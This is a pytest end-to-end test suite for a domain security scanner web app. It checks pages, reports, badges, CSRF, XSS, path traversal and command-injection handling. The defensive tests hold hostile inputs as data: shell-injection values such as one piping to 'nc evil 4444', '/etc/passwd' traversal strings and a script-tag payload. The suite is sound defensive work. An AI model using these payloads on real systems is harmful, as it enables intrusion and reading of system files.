"""
test_e2e.py — end-to-end HTTP tests using FastAPI TestClient

Tests actual HTTP requests against the app without network dependency:
  - Every route returns correct status code
  - Template rendering works (no Jinja2 errors)
  - Scan flow: POST /scan -> redirect -> GET /result/{id}
  - API endpoint returns valid JSON
  - Error pages render correctly
  - CSRF protection works
  - Rate limiting works
  - Static files served
  - Badge SVG valid
  - Enterprise note in response

Run: cd app && python -m pytest tests/test_e2e.py -v
"""

import copy
from datetime import UTC
from unittest.mock import patch

import pytest
from db import init_db, save_scan
from fastapi.testclient import TestClient
from main import app

# init test DB
init_db()

client = TestClient(app)

# CSRF-safe headers for POST requests
CSRF_HEADERS = {"Origin": "https://contrastcyber.com"}


# === Mock helpers ===

MOCK_SCAN_RESULT = {
    "domain": "example.com",
    "total_score": 75,
    "max_score": 100,
    "grade": "B",
    "headers": {
        "score": 20,
        "max": 30,
        "details": [
            {"header": "content-security-policy", "present": True},
            {"header": "strict-transport-security", "present": True},
            {"header": "x-content-type-options", "present": True},
            {"header": "x-frame-options", "present": True},
            {"header": "referrer-policy", "present": False},
            {"header": "permissions-policy", "present": False},
        ],
    },
    "ssl": {
        "score": 25,
        "max": 25,
        "details": {
            "tls_version": "TLSv1.3",
            "cipher": "TLS_AES_256_GCM_SHA384",
            "cipher_score": 8,
            "cert_valid": True,
            "chain_valid": True,
            "days_remaining": 60,
            "cert_score": 8,
        },
    },
    "dns": {"score": 15, "max": 15, "details": {"spf": True, "dmarc": True, "dkim": True}},
    "redirect": {"score": 10, "max": 10, "details": {"redirects_to_https": True}},
    "disclosure": {"score": 5, "max": 5, "details": {"server_exposed": False, "powered_by_exposed": False}},
    "cookies": {"score": 5, "max": 5, "details": {"cookies_found": 0}},
    "dnssec": {"score": 0, "max": 5, "details": {"dnssec_enabled": False}},
    "methods": {
        "score": 5,
        "max": 5,
        "details": {"trace_enabled": False, "delete_enabled": False, "put_enabled": False},
    },
    "cors": {
        "score": 5,
        "max": 5,
        "details": {
            "wildcard_origin": False,
            "reflects_origin": False,
            "credentials_with_wildcard": False,
            "cors_credentials": False,
        },
    },
    "html": {
        "score": 5,
        "max": 5,
        "details": {
            "mixed_active": 0,
            "mixed_passive": 0,
            "inline_scripts": 0,
            "inline_handlers": 0,
            "external_scripts": 0,
            "external_scripts_no_sri": 0,
            "forms_total": 0,
            "forms_http_action": 0,
        },
    },
    "csp_analysis": {
        "score": 2,
        "max": 2,
        "details": {
            "csp_present": True,
            "unsafe_inline": False,
            "unsafe_eval": False,
            "wildcard_source": False,
            "data_uri": False,
            "blob_uri": False,
        },
    },
}


def mock_run_scan(domain, resolved_ip=None):
    result = copy.deepcopy(MOCK_SCAN_RESULT)
    result["domain"] = domain
    return result


def mock_validate_domain(domain):
    if domain in ("example.com", "google.com"):
        return "93.184.216.34"
    return None


# === Page rendering ===


class TestPages:
    def test_home_status(self):
        r = client.get("/")
        assert r.status_code == 200

    def test_home_contains_contrastscan(self):
        r = client.get("/")
        assert "ContrastScan" in r.text

    def test_home_contains_scan_form(self):
        r = client.get("/")
        assert 'action="/scan"' in r.text

    def test_home_contains_11_feature_cards(self):
        r = client.get("/")
        assert r.text.count('class="feature"') == 11

    def test_home_has_meta_description(self):
        r = client.get("/")
        assert 'name="description"' in r.text

    def test_home_has_og_title(self):
        r = client.get("/")
        assert "og:title" in r.text

    def test_api_page_status(self):
        r = client.get("/api")
        assert r.status_code == 200

    def test_api_page_contains_api(self):
        r = client.get("/api")
        assert "API" in r.text

    def test_stats_page_status(self):
        r = client.get("/stats")
        assert r.status_code == 200

    def test_stats_page_contains_stats(self):
        r = client.get("/stats")
        assert "Stats" in r.text or "stats" in r.text


# === Static files ===


class TestStatic:
    def test_base_css_status(self):
        r = client.get("/static/css/base.css")
        assert r.status_code == 200

    def test_base_css_has_content(self):
        r = client.get("/static/css/base.css")
        assert len(r.text) > 100

    def test_base_css_contains_btn(self):
        r = client.get("/static/css/base.css")
        assert ".btn" in r.text

    def test_base_css_has_focus_visible(self):
        r = client.get("/static/css/base.css")
        assert "focus-visible" in r.text


# === SEO / Meta routes ===


class TestMetaRoutes:
    def test_robots_txt_status(self):
        r = client.get("/robots.txt")
        assert r.status_code == 200

    def test_robots_txt_has_disallow(self):
        r = client.get("/robots.txt")
        assert "Disallow" in r.text

    def test_robots_txt_has_sitemap(self):
        r = client.get("/robots.txt")
        assert "Sitemap" in r.text

    def test_sitemap_xml_status(self):
        r = client.get("/sitemap.xml")
        assert r.status_code == 200

    def test_sitemap_xml_is_valid_xml(self):
        r = client.get("/sitemap.xml")
        assert "<?xml" in r.text

    def test_sitemap_xml_has_homepage(self):
        r = client.get("/sitemap.xml")
        assert "contrastcyber.com/" in r.text

    def test_llms_txt_status(self):
        r = client.get("/llms.txt")
        assert r.status_code in (200, 500)


# === Error pages ===


class TestErrorPages:
    def test_invalid_scan_id_404(self):
        r = client.get("/result/invalidid")
        assert r.status_code == 404

    def test_404_page_renders(self):
        r = client.get("/result/invalidid")
        assert "Not Found" in r.text

    def test_nonexistent_scan_404(self):
        r = client.get("/result/" + "b" * 32)
        assert r.status_code == 404

    def test_unknown_route_404(self):
        r = client.get("/nonexistent-path")
        assert r.status_code == 404


# === Scan flow (mocked scanner) ===


class TestScanFlow:
    def test_post_scan_redirects(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            assert r.status_code == 303

    def test_redirects_to_result(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            assert r.headers.get("location", "").startswith("/result/")

    def test_result_page_200(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            location = r.headers.get("location", "")
            r2 = client.get(location)
            assert r2.status_code == 200

    def test_result_page_has_domain(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "example.com" in r2.text

    def test_result_page_has_grade(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "grade-letter" in r2.text

    def test_result_page_has_score(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "/100" in r2.text

    def test_result_page_has_module_cards(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert r2.text.count('class="section"') >= 5

    def test_result_page_has_copy_link(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "Copy Link" in r2.text

    def test_result_page_has_findings(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "Findings" in r2.text or "findings" in r2.text

    def test_result_page_has_methods_module(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "HTTP Methods" in r2.text or "methods" in r2.text.lower()

    def test_result_page_has_cors_module(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "CORS" in r2.text

    def test_result_page_has_html_module(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "HTML" in r2.text

    def test_result_page_has_csp_analysis_module(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "CSP" in r2.text

    def test_result_page_has_11_module_cards(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert r2.text.count('class="section"') >= 11

    def test_result_page_has_base_css(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            r2 = client.get(r.headers.get("location", ""))
            assert "base.css?v=" in r2.text


# === CSRF protection ===


class TestCsrfE2e:
    def test_no_origin_header_allowed(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            assert r.status_code == 303

    def test_valid_origin_allowed(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post(
                "/scan",
                data={"domain": "example.com"},
                headers={"Origin": "https://contrastcyber.com"},
                follow_redirects=False,
            )
            assert r.status_code == 303

    def test_evil_origin_blocked(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post(
                "/scan", data={"domain": "example.com"}, headers={"Origin": "https://evil.com"}, follow_redirects=False
            )
            assert r.status_code == 403


# === API endpoint ===


class TestApiEndpoint:
    def test_api_scan_status(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert r.status_code == 200

    def test_api_returns_json(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert isinstance(r.json(), dict)

    def test_api_json_has_domain(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert r.json().get("domain") == "example.com"

    def test_api_json_has_grade(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert "grade" in r.json()

    def test_api_json_has_total_score(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert "total_score" in r.json()

    def test_api_json_has_11_modules(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            data = r.json()
            assert all(
                k in data
                for k in [
                    "headers",
                    "ssl",
                    "dns",
                    "redirect",
                    "disclosure",
                    "cookies",
                    "dnssec",
                    "methods",
                    "cors",
                    "html",
                    "csp_analysis",
                ]
            )

    def test_api_json_has_findings(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert "findings" in r.json()

    def test_api_json_has_findings_count(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            assert "findings_count" in r.json()

    def test_invalid_domain_400(self):
        r = client.get("/api/scan?domain=invalid")
        assert r.status_code == 400

    def test_missing_domain_422(self):
        r = client.get("/api/scan")
        assert r.status_code == 422

    def test_api_report_status(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/report?domain=example.com")
            assert r.status_code == 200

    def test_api_report_is_text(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/report?domain=example.com")
            assert "text/plain" in r.headers.get("content-type", "")

    def test_api_report_has_attachment(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/report?domain=example.com")
            assert "attachment" in r.headers.get("content-disposition", "")

    def test_api_report_has_domain(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/report?domain=example.com")
            assert "example.com" in r.text

    def test_api_report_has_grade(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/report?domain=example.com")
            assert "Grade:" in r.text

    def test_api_report_has_module_breakdown(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/report?domain=example.com")
            assert "MODULE BREAKDOWN" in r.text


# === Rate limiting ===


class TestRateLimitE2e:
    def test_ip_hourly_limit_triggers_429(self):
        """Exhaust IP hourly limit via DB, then next scan returns 429."""
        # Pre-fill the ip_limits table to simulate exhausted limit
        from datetime import datetime

        from config import HOURLY_LIMIT
        from db import get_db

        now = datetime.now(UTC)
        window_start = now.replace(minute=0, second=0, microsecond=0).isoformat()
        with get_db() as con:
            con.execute(
                "INSERT OR REPLACE INTO ip_limits (ip, usage, window_start) VALUES (?, ?, ?)",
                ("testclient", HOURLY_LIMIT, window_start),
            )

        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            assert r.status_code == 429


# === Enterprise note ===


class TestEnterpriseE2e:
    def test_enterprise_note_visible_for_google(self):
        mock_google = copy.deepcopy(MOCK_SCAN_RESULT)
        mock_google["domain"] = "google.com"

        with (
            patch("scanner.run_scan", return_value=mock_google),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "google.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            assert r.status_code == 303
            location = r.headers.get("location", "")
            r2 = client.get(location)
            assert "enterprise-note" in r2.text

    def test_enterprise_note_mentions_google(self):
        mock_google = copy.deepcopy(MOCK_SCAN_RESULT)
        mock_google["domain"] = "google.com"

        with (
            patch("scanner.run_scan", return_value=mock_google),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "google.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            location = r.headers.get("location", "")
            r2 = client.get(location)
            assert "Google" in r2.text


# === Report TXT ===


class TestReport:
    @pytest.fixture(autouse=True)
    def setup_scan(self):
        """Create a scan for report tests."""
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            self.scan_id = r.headers.get("location", "").split("/result/")[-1]

    def test_report_status(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert r.status_code == 200

    def test_report_content_type(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "text/plain" in r.headers.get("content-type", "")

    def test_report_has_content_disposition(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "attachment" in r.headers.get("content-disposition", "")

    def test_report_filename_has_domain(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "example.com" in r.headers.get("content-disposition", "")

    def test_report_has_domain(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "example.com" in r.text

    def test_report_has_grade(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "Grade:" in r.text

    def test_report_has_score(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "/100" in r.text

    def test_report_has_module_breakdown(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "MODULE BREAKDOWN" in r.text

    def test_report_has_headers_section(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "Security Headers" in r.text

    def test_report_has_ssl_section(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "SSL / TLS" in r.text

    def test_report_has_dns_section(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "DNS Security" in r.text

    def test_report_has_redirect(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "HTTP Redirect" in r.text

    def test_report_has_disclosure(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "Info Disclosure" in r.text

    def test_report_has_cookies(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "Cookie Security" in r.text

    def test_report_has_dnssec(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "DNSSEC" in r.text

    def test_report_has_methods(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "HTTP Methods" in r.text

    def test_report_has_cors(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "CORS" in r.text

    def test_report_has_html_analysis(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "HTML Analysis" in r.text

    def test_report_has_csp_analysis(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "CSP Analysis" in r.text

    def test_report_has_findings(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert "FINDINGS" in r.text

    def test_report_has_result_link(self):
        r = client.get(f"/report/{self.scan_id}.txt")
        assert f"/result/{self.scan_id}" in r.text

    def test_invalid_report_404(self):
        r = client.get("/report/invalidid.txt")
        assert r.status_code == 404

    def test_nonexistent_report_404(self):
        r = client.get("/report/" + "b" * 32 + ".txt")
        assert r.status_code == 404


# === Badge SVG ===


class TestBadge:
    @pytest.fixture(autouse=True)
    def setup_badge_data(self):
        from db import get_scan

        if not get_scan("a" * 32):
            save_scan("a" * 32, "badge-test.com", {"grade": "A", "total_score": 100}, "A", 100)

    def test_badge_status(self):
        r = client.get("/badge/badge-test.com.svg")
        assert r.status_code == 200

    def test_badge_is_svg(self):
        r = client.get("/badge/badge-test.com.svg")
        assert "image/svg+xml" in r.headers.get("content-type", "")

    def test_badge_contains_grade_a(self):
        r = client.get("/badge/badge-test.com.svg")
        assert ">A<" in r.text

    def test_badge_has_cache_header(self):
        r = client.get("/badge/badge-test.com.svg")
        assert "max-age" in r.headers.get("cache-control", "")

    def test_badge_unknown_domain_404(self):
        r = client.get("/badge/nonexistent-domain.com.svg")
        assert r.status_code == 404


# === OpenAPI hidden ===


class TestOpenApiHidden:
    def test_openapi_json_200(self):
        r = client.get("/openapi.json")
        assert r.status_code == 200
        data = r.json()
        assert data["info"]["title"] == "ContrastScan"

    def test_docs_404(self):
        r = client.get("/docs")
        assert r.status_code == 404

    def test_redoc_404(self):
        r = client.get("/redoc")
        assert r.status_code == 404


# === SECURITY: XSS Prevention ===


class TestXssPrevention:
    """Verify user-supplied data is escaped in HTML responses."""

    def test_xss_in_domain_escaped_on_result_page(self):
        """If a malicious domain somehow reaches the result page, it must be escaped."""
        from db import save_scan

        xss_domain = "<script>alert(1)</script>"
        scan_id = "e" * 32
        result_data = {
            "domain": xss_domain,
            "total_score": 50,
            "max_score": 100,
            "grade": "C",
            "headers": {"score": 10, "max": 30, "details": []},
            "ssl": {"score": 10, "max": 25, "details": {}},
            "dns": {"score": 10, "max": 20, "details": {"spf": True, "dmarc": True, "dkim": True}},
            "redirect": {"score": 5, "max": 10, "details": {"redirects_to_https": True}},
            "disclosure": {"score": 5, "max": 5, "details": {"server_exposed": False, "powered_by_exposed": False}},
            "cookies": {"score": 5, "max": 5, "details": {"cookies_found": 0}},
            "dnssec": {"score": 0, "max": 5, "details": {"dnssec_enabled": False}},
            "methods": {
                "score": 5,
                "max": 5,
                "details": {"trace_enabled": False, "delete_enabled": False, "put_enabled": False},
            },
            "cors": {
                "score": 0,
                "max": 5,
                "details": {
                    "wildcard_origin": False,
                    "reflects_origin": False,
                    "credentials_with_wildcard": False,
                    "cors_credentials": False,
                },
            },
            "html": {
                "score": 0,
                "max": 5,
                "details": {
                    "mixed_active": 0,
                    "mixed_passive": 0,
                    "inline_scripts": 0,
                    "inline_handlers": 0,
                    "external_scripts": 0,
                    "external_scripts_no_sri": 0,
                    "forms_total": 0,
                    "forms_http_action": 0,
                },
            },
            "csp_analysis": {"score": 0, "max": 2, "details": {"csp_present": False}},
        }
        save_scan(scan_id, xss_domain, result_data, "C", 50)
        r = client.get(f"/result/{scan_id}")
        assert r.status_code == 200
        # Raw <script> should NOT appear — Jinja2 auto-escapes to &lt;script&gt;
        assert "<script>alert(1)</script>" not in r.text

    def test_xss_in_api_response_is_json_safe(self):
        """API responses are JSON — XSS payloads should be string-escaped."""
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.get("/api/scan?domain=example.com")
            raw = r.text
            # JSON-encoded strings won't execute as HTML
            assert "<script>" not in raw or '"<script>' in raw or "\\u003c" in raw.lower()


# === SECURITY: CSRF Enforcement via HTTP ===


class TestCsrfEnforcementE2e:
    """Full HTTP CSRF tests — evil origins, referer spoofing."""

    def test_evil_origin_post_scan_blocked(self):
        r = client.post(
            "/scan", data={"domain": "example.com"}, headers={"Origin": "https://evil.com"}, follow_redirects=False
        )
        assert r.status_code == 403

    def test_evil_referer_post_scan_blocked(self):
        r = client.post(
            "/scan",
            data={"domain": "example.com"},
            headers={"Referer": "https://evil.com/phish"},
            follow_redirects=False,
        )
        assert r.status_code == 403

    def test_null_origin_post_scan_blocked(self):
        r = client.post("/scan", data={"domain": "example.com"}, headers={"Origin": "null"}, follow_redirects=False)
        assert r.status_code == 403

    def test_http_downgrade_origin_blocked(self):
        r = client.post(
            "/scan",
            data={"domain": "example.com"},
            headers={"Origin": "http://contrastcyber.com"},
            follow_redirects=False,
        )
        assert r.status_code == 403

    def test_subdomain_spoof_origin_blocked(self):
        r = client.post(
            "/scan",
            data={"domain": "example.com"},
            headers={"Origin": "https://contrastcyber.com.evil.com"},
            follow_redirects=False,
        )
        assert r.status_code == 403

    def test_www_origin_allowed(self):
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post(
                "/scan",
                data={"domain": "example.com"},
                headers={"Origin": "https://www.contrastcyber.com"},
                follow_redirects=False,
            )
            assert r.status_code == 303


# === SECURITY: Report Path Traversal via HTTP ===


class TestReportPathTraversalE2e:
    """Verify report endpoint blocks path traversal scan IDs."""

    @pytest.mark.parametrize(
        "bad_id",
        [
            "../../../etc/passwd",
            "..%2f..%2fetc%2fpasswd",
            "aaaa/../../etc/passwd",
            "a" * 31,
            "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
            "",
        ],
    )
    def test_traversal_scan_id_blocked(self, bad_id):
        r = client.get(f"/report/{bad_id}.txt")
        assert r.status_code in (404, 422)

    def test_valid_hex_but_nonexistent_404(self):
        r = client.get(f"/report/{'c' * 32}.txt")
        assert r.status_code == 404


# === SECURITY: Command Injection via HTTP ===


class TestCommandInjectionE2e:
    """Verify shell metacharacters in domain are rejected at HTTP level."""

    @pytest.mark.parametrize(
        "payload",
        [
            "example.com; cat /etc/passwd",
            "$(whoami).com",
            "`id`.com",
            "example.com | nc evil 4444",
        ],
    )
    def test_shell_metachar_rejected_400(self, payload):
        r = client.get("/api/scan", params={"domain": payload})
        assert r.status_code == 400


# === SECURITY: API Error Messages Don't Leak Info ===


class TestApiErrorLeakage:
    """Verify error responses don't expose internal paths or stack traces."""

    def test_invalid_domain_error_no_path_leak(self):
        r = client.get("/api/scan?domain=invalid")
        assert "/tmp/" not in r.text
        assert "/home/" not in r.text
        assert "Traceback" not in r.text

    def test_404_no_path_leak(self):
        r = client.get("/result/nonexistent")
        assert "/tmp/" not in r.text
        assert "Traceback" not in r.text

    def test_invalid_api_key_no_hash_leak(self):
        r = client.get("/api/scan?domain=example.com", headers={"Authorization": "Bearer csc_invalid123"})
        assert "sha256" not in r.text.lower()
        assert "hash" not in r.text.lower()


# === SECURITY: Badge SVG Injection ===


class TestBadgeSvgInjection:
    """Verify badge endpoint doesn't allow SVG injection via domain."""

    def test_xss_domain_in_badge_blocked(self):
        r = client.get("/badge/<script>alert(1)</script>.svg")
        # Should be 400 (invalid domain) or 404 (no scan)
        assert r.status_code in (400, 404)

    def test_badge_grade_is_sanitized(self):
        """Grade value in SVG is restricted to A/B/C/D/F/?."""
        from db import save_scan

        save_scan("b" * 32, "badge-safe.com", {"grade": "A", "total_score": 100}, "A", 100)
        r = client.get("/badge/badge-safe.com.svg")
        assert r.status_code == 200
        # Grade should only be a single letter
        assert ">A<" in r.text


# === Security Test 1 — IP Spoofing Rate Limit Bypass via HTTP ===


class TestIpSpoofingE2e:
    """CRITICAL: Verify that spoofed X-Real-IP headers work at HTTP level.
    Documents the vulnerability for nginx-layer defense."""

    def test_spoofed_ip_bypass_via_http(self):
        """HTTP-level test: first request from spoofed IP succeeds."""
        from ratelimit import reset_all

        reset_all()

        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post(
                "/scan",
                data={"domain": "example.com"},
                headers={"X-Real-IP": "fresh-attacker-ip", "Origin": "https://contrastcyber.com"},
                follow_redirects=False,
            )
            assert r.status_code == 303  # succeeds with spoofed IP


# === Security Test 2 — CSRF Bypass No Headers via HTTP ===


class TestCsrfBypassE2e:
    """POST /scan with no Origin AND no Referer is now BLOCKED (fix applied)."""

    def test_no_origin_no_referer_scan_blocked(self):
        """Requests with no Origin/Referer are now blocked."""
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False)
            assert r.status_code == 403

    def test_origin_null_blocked(self):
        """Origin: null (sandbox, cross-scheme) must be blocked."""
        r = client.post("/scan", data={"domain": "example.com"}, headers={"Origin": "null"}, follow_redirects=False)
        assert r.status_code == 403

    def test_origin_file_scheme_blocked(self):
        """Origin: file:// must be blocked."""
        r = client.post("/scan", data={"domain": "example.com"}, headers={"Origin": "file://"}, follow_redirects=False)
        assert r.status_code == 403

    def test_referer_data_uri_blocked(self):
        """Referer with data: URI must be blocked."""
        r = client.post(
            "/scan",
            data={"domain": "example.com"},
            headers={"Referer": "data:text/html,<form>"},
            follow_redirects=False,
        )
        assert r.status_code == 403


# === Security Test 4 — Report Endpoint DoS (blocking sleep loop) ===


class TestReportDoS:
    """HIGH: report_txt has a 35s sleep loop polling for recon.
    Verify the endpoint doesn't block indefinitely."""

    def test_report_with_no_recon_returns_within_timeout(self):
        """When recon never completes, report should still return (after polling)."""
        import time

        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            scan_id = r.headers.get("location", "").split("/result/")[-1]

        with patch("main.get_recon", return_value=None):
            start = time.time()
            r = client.get(f"/report/{scan_id}.txt")
            elapsed = time.time() - start
            assert r.status_code == 200
            assert elapsed < 15  # max 10s poll + overhead

    def test_report_with_completed_recon_returns_fast(self):
        """When recon is already done, report returns immediately."""
        import time

        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            scan_id = r.headers.get("location", "").split("/result/")[-1]

        done_recon = {"status": "done", "result": '{"whois": {}, "subdomains": {"subdomains": [], "count": 0}}'}
        with patch("main.get_recon", return_value=done_recon):
            start = time.time()
            r = client.get(f"/report/{scan_id}.txt")
            elapsed = time.time() - start
            assert r.status_code == 200
            assert elapsed < 2


